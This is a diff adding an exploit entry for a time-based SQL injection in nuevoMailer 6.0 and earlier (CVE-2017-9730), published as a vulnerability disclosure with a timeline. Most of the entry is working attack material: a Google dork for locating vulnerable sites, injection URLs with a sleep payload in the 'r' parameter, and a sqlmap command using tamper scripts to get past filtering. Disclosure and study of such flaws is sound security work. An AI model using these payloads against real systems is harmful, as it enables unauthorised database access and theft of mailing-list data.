@@ -1,0 +1,27 @@
+# Exploit Title: nuevoMailer version 6.0 and earlier time-based SQL Injection
+# Exploit Author: ALEH BOITSAU
+# Google Dork: inurl:/inc/rdr.php?
+# Date: 2017-06-09
+# Vendor Homepage: https://www.nuevomailer.com/
+# Version: 6.0 and earlier
+# Tested on: Linux
+# CVE: CVE-2017-9730
+
+Description: SQL injection vulnerability in rdr.php in nuevoMailer version 6.0 and earlier 
+allows remote attackers to execute arbitrary SQL commands via the "r" parameter. 
+
+PoC:
+
+https://vulnerable_site.com/inc/rdr.php?r=69387c602c1056c556[time based SQL INJ]
+
+https://vulnerable_site.com/inc/rdr.php?r=69387c602c1056c556%20and%20sleep(10)--+
+
+sqlmap -u "http://vulnerable_site.com/inc/rdr.php?r=120c44c5" --dbms=mysql -p r --tamper=equaltolike,between  --hostname --technique=T -v 3 --random-agent --time-sec=4
+
+NB: "equaltolike" and "between" arsenal to defeat filtering! Data retrieval process may take more than usual time.
+
+Disclosure Timeline:
+2017-06-09: Vendor has been notified
+2017-06-09: Vendor responded with intention to fix the vulnerability
+2017-06-16: CVE number acquired
+2017-06-16: Public disclosure
